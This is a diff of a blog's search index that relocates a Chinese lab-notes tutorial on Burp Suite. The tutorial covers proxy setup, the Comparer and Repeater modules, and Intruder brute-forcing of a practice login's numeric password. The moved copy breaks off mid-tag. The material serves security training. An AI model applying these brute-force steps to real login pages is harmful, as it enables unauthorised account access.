@@ -1,62 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>使用burp进行暴力破解</title>
-    <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
-<span id="more"></span>
-
-<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png"></p>
-<h3 id="0X01-暴力破解"><a href="#0X01-暴力破解" class="headerlink" title="0X01 暴力破解"></a>0X01 <strong>暴力破解</strong></h3><p>​    一般使用暴力破解都有两种原因：</p>
-<ol>
-<li><p>对这个漏洞的测试，人是可以完成的，即可穷举。</p>
-</li>
-<li><p>人可以完成，但是代价太大，或者太浪费时间。</p>
-<p>正是出于这样的问题，一些软件的出现帮助人完成了这些测试，这就是暴力破解的真正好处。在业界曾经有这样的一种看法，对于暴力破解的使用都不屑一          顾，因为大家觉得技术含量太低。但是，从实际的情况来看，因为用户使用弱口令情况太普遍，导致很多漏洞使用暴力破解都可以轻松拿下。</p>
-<p>暴力破解，最有价值的地方是在对字典的构造上，这是一门技术，需要长期的经验积累。</p>
-</li>
-</ol>
-<h3 id="0x02-Burp-Suite代理和浏览器设置"><a href="#0x02-Burp-Suite代理和浏览器设置" class="headerlink" title="0x02 Burp Suite代理和浏览器设置"></a>0x02 Burp Suite代理和浏览器设置</h3><p>​    当Burp Suite 启动之后，默认分配的代理地址和端口是127.0.0.1 ：8080,可以从Burp Suite的proxy选项卡的options上查看。</p>
-<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png"></p>
-<h4 id="1-IE设置"><a href="#1-IE设置" class="headerlink" title="1. IE设置"></a>1. IE设置</h4><h5 id="1-启动IE浏览器"><a href="#1-启动IE浏览器" class="headerlink" title="(1)  启动IE浏览器"></a>(1)  启动IE浏览器</h5><h5 id="2-点击【工具】菜单，选择【Internet】选项"><a href="#2-点击【工具】菜单，选择【Internet】选项" class="headerlink" title="(2)  点击【工具】菜单，选择【Internet】选项"></a>(2)  点击【工具】菜单，选择【Internet】选项</h5><h5 id="3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。"><a href="#3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。" class="headerlink" title="(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。"></a>(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.png"></p>
-<h5 id="4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置"><a href="#4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置" class="headerlink" title="(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置"></a>(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.png"></p>
-<h5 id="5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面"><a href="#5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面" class="headerlink" title="(5)  这时，IE的设置已经完成，你可以访问 http://burp 将会看到Burp Suite的欢迎界面"></a>(5)  这时，IE的设置已经完成，你可以访问 <a href="http://burp/">http://burp</a> 将会看到Burp Suite的欢迎界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.png"></p>
-<h4 id="2-FireFox设置"><a href="#2-FireFox设置" class="headerlink" title="2. FireFox设置"></a>2. FireFox设置</h4><p>​    与IE的设置类似，在FireFox中，我们也要进行一些参数设置，才能将FireFox浏览器的通信流量，通过Burp Suite代理进行传输。详细的步骤如下：</p>
-<h5 id="1-启动FireFox浏览器，点击【工具】菜单，点击【选项】"><a href="#1-启动FireFox浏览器，点击【工具】菜单，点击【选项】" class="headerlink" title="(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】"></a>(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.png"></p>
-<h5 id="2-依次点击【高级】-【网络】【设置】"><a href="#2-依次点击【高级】-【网络】【设置】" class="headerlink" title="(2)    依次点击【高级】 【网络】【设置】"></a>(2)    依次点击【高级】 【网络】【设置】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.png"></p>
-<h5 id="3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"><a href="#3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。" class="headerlink" title="(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"></a>(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png"></p>
-<h4 id="3-Google-Chrome设置"><a href="#3-Google-Chrome设置" class="headerlink" title="3. Google Chrome设置"></a>3. Google Chrome设置</h4><p>​    Google Chrome使用Burp Suite作为代理服务器的配置步骤如下：</p>
-<h5 id="1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面"><a href="#1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面" class="headerlink" title="(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面"></a>(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.png"></p>
-<h5 id="2-在搜索中搜索代理，点击进入"><a href="#2-在搜索中搜索代理，点击进入" class="headerlink" title="(2)  在搜索中搜索代理，点击进入"></a>(2)  在搜索中搜索代理，点击进入</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.png"></p>
-<h5 id="3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"><a href="#3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。" class="headerlink" title="(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"></a>(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。</h5><h3 id="0x03-熟悉comparer，repeater，intruder模块"><a href="#0x03-熟悉comparer，repeater，intruder模块" class="headerlink" title="0x03 熟悉comparer，repeater，intruder模块"></a>0x03 <strong>熟悉comparer，repeater，intruder模块</strong></h3><h4 id="1-comparer模块"><a href="#1-comparer模块" class="headerlink" title="1.  comparer模块"></a>1.  comparer模块</h4><h5 id="1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。"><a href="#1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。" class="headerlink" title="(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。"></a>(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.png"></p>
-<h5 id="2-此时，compare模块，上下界面多了一条记录"><a href="#2-此时，compare模块，上下界面多了一条记录" class="headerlink" title="(2)  此时，compare模块，上下界面多了一条记录"></a>(2)  此时，compare模块，上下界面多了一条记录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.png"></p>
-<h5 id="3-使用同样的方法，我们在为comparer模块添加另外的一条记录"><a href="#3-使用同样的方法，我们在为comparer模块添加另外的一条记录" class="headerlink" title="(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录"></a>(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录</h5><h5 id="4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）"><a href="#4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）" class="headerlink" title="(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）"></a>(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.png"></p>
-<h4 id="2-repeater模块"><a href="#2-repeater模块" class="headerlink" title="2.  repeater模块"></a>2.  repeater模块</h4><h5 id="1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了"><a href="#1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了" class="headerlink" title="(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了"></a>(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/14.png"></p>
-<h5 id="2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"><a href="#2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。" class="headerlink" title="(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"></a>(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/15.png"></p>
-<h4 id="3-Intruder-模块"><a href="#3-Intruder-模块" class="headerlink" title="3. Intruder 模块"></a>3. Intruder 模块</h4><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p>
-<ol>
-<li><p>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。</p>
-</li>
-<li><p>提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。</p>
-</li>
-<li><p>模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
-</li>
-</ol>
-<h5 id="1-抓取登录框的数据包，并将数据包发送至Intruder模块"><a href="#1-抓取登录框的数据包，并将数据包发送至Intruder模块" class="headerlink" title="(1)  抓取登录框的数据包，并将数据包发送至Intruder模块"></a>(1)  抓取登录框的数据包，并将数据包发送至Intruder模块</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/16.png"></p>
-<h5 id="2-将需要爆破的参数标记"><a href="#2-将需要爆破的参数标记" class="headerlink" title="(2)  将需要爆破的参数标记"></a>(2)  将需要爆破的参数标记</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/17.png"></p>
-<h5 id="3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"><a href="#3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破" class="headerlink" title="(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"></a>(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/18.png"></p>
-<h5 id="4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it"><a href="#4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it" class="headerlink" title="(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it"></a>(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/19.png"></p>
-<h5 id="5-返回网页，使用-用户名hetian-密码69-成功登录"><a href="#5-返回网页，使用-用户名hetian-密码69-成功登录" class="headerlink" title="(5)  返回网页，使用 用户名hetian 密码69 成功登录"></a>(5)  返回网页，使用 用户名hetian 密码69 成功登录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/20.png"></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>实验笔记</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CORS</title>
     <url>/2021/02/24/CORS/</url>
     <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><hr>
@@ -111,6 +55,208 @@
       </categories>
       <tags>
         <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用burp进行暴力破解</title>
+    <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
+<span id="more"></span>
+
+<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png"></p>
+<h3 id="0X01-暴力破解"><a href="#0X01-暴力破解" class="headerlink" title="0X01 暴力破解"></a>0X01 <strong>暴力破解</strong></h3><p>​    一般使用暴力破解都有两种原因：</p>
+<ol>
+<li><p>对这个漏洞的测试，人是可以完成的，即可穷举。</p>
+</li>
+<li><p>人可以完成，但是代价太大，或者太浪费时间。</p>
+<p>正是出于这样的问题，一些软件的出现帮助人完成了这些测试，这就是暴力破解的真正好处。在业界曾经有这样的一种看法，对于暴力破解的使用都不屑一          顾，因为大家觉得技术含量太低。但是，从实际的情况来看，因为用户使用弱口令情况太普遍，导致很多漏洞使用暴力破解都可以轻松拿下。</p>
+<p>暴力破解，最有价值的地方是在对字典的构造上，这是一门技术，需要长期的经验积累。</p>
+</li>
+</ol>
+<h3 id="0x02-Burp-Suite代理和浏览器设置"><a href="#0x02-Burp-Suite代理和浏览器设置" class="headerlink" title="0x02 Burp Suite代理和浏览器设置"></a>0x02 Burp Suite代理和浏览器设置</h3><p>​    当Burp Suite 启动之后，默认分配的代理地址和端口是127.0.0.1 ：8080,可以从Burp Suite的proxy选项卡的options上查看。</p>
+<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png"></p>
+<h4 id="1-IE设置"><a href="#1-IE设置" class="headerlink" title="1. IE设置"></a>1. IE设置</h4><h5 id="1-启动IE浏览器"><a href="#1-启动IE浏览器" class="headerlink" title="(1)  启动IE浏览器"></a>(1)  启动IE浏览器</h5><h5 id="2-点击【工具】菜单，选择【Internet】选项"><a href="#2-点击【工具】菜单，选择【Internet】选项" class="headerlink" title="(2)  点击【工具】菜单，选择【Internet】选项"></a>(2)  点击【工具】菜单，选择【Internet】选项</h5><h5 id="3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。"><a href="#3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。" class="headerlink" title="(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。"></a>(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.png"></p>
+<h5 id="4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置"><a href="#4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置" class="headerlink" title="(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置"></a>(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.png"></p>
+<h5 id="5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面"><a href="#5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面" class="headerlink" title="(5)  这时，IE的设置已经完成，你可以访问 http://burp 将会看到Burp Suite的欢迎界面"></a>(5)  这时，IE的设置已经完成，你可以访问 <a href="http://burp/">http://burp</a> 将会看到Burp Suite的欢迎界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.png"></p>
+<h4 id="2-FireFox设置"><a href="#2-FireFox设置" class="headerlink" title="2. FireFox设置"></a>2. FireFox设置</h4><p>​    与IE的设置类似，在FireFox中，我们也要进行一些参数设置，才能将FireFox浏览器的通信流量，通过Burp Suite代理进行传输。详细的步骤如下：</p>
+<h5 id="1-启动FireFox浏览器，点击【工具】菜单，点击【选项】"><a href="#1-启动FireFox浏览器，点击【工具】菜单，点击【选项】" class="headerlink" title="(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】"></a>(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.png"></p>
+<h5 id="2-依次点击【高级】-【网络】【设置】"><a href="#2-依次点击【高级】-【网络】【设置】" class="headerlink" title="(2)    依次点击【高级】 【网络】【设置】"></a>(2)    依次点击【高级】 【网络】【设置】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.png"></p>
+<h5 id="3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"><a href="#3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。" class="headerlink" title="(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"></a>(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png"></p>
+<h4 id="3-Google-Chrome设置"><a href="#3-Google-Chrome设置" class="headerlink" title="3. Google Chrome设置"></a>3. Google Chrome设置</h4><p>​    Google Chrome使用Burp Suite作为代理服务器的配置步骤如下：</p>
+<h5 id="1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面"><a href="#1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面" class="headerlink" title="(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面"></a>(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.png"></p>
+<h5 id="2-在搜索中搜索代理，点击进入"><a href="#2-在搜索中搜索代理，点击进入" class="headerlink" title="(2)  在搜索中搜索代理，点击进入"></a>(2)  在搜索中搜索代理，点击进入</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.png"></p>
+<h5 id="3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"><a href="#3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。" class="headerlink" title="(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"></a>(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。</h5><h3 id="0x03-熟悉comparer，repeater，intruder模块"><a href="#0x03-熟悉comparer，repeater，intruder模块" class="headerlink" title="0x03 熟悉comparer，repeater，intruder模块"></a>0x03 <strong>熟悉comparer，repeater，intruder模块</strong></h3><h4 id="1-comparer模块"><a href="#1-comparer模块" class="headerlink" title="1.  comparer模块"></a>1.  comparer模块</h4><h5 id="1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。"><a href="#1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。" class="headerlink" title="(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。"></a>(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.png"></p>
+<h5 id="2-此时，compare模块，上下界面多了一条记录"><a href="#2-此时，compare模块，上下界面多了一条记录" class="headerlink" title="(2)  此时，compare模块，上下界面多了一条记录"></a>(2)  此时，compare模块，上下界面多了一条记录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.png"></p>
+<h5 id="3-使用同样的方法，我们在为comparer模块添加另外的一条记录"><a href="#3-使用同样的方法，我们在为comparer模块添加另外的一条记录" class="headerlink" title="(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录"></a>(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录</h5><h5 id="4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）"><a href="#4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）" class="headerlink" title="(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）"></a>(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.png"></p>
+<h4 id="2-repeater模块"><a href="#2-repeater模块" class="headerlink" title="2.  repeater模块"></a>2.  repeater模块</h4><h5 id="1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了"><a href="#1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了" class="headerlink" title="(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了"></a>(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/14.png"></p>
+<h5 id="2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"><a href="#2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。" class="headerlink" title="(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"></a>(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。</h5><p><img 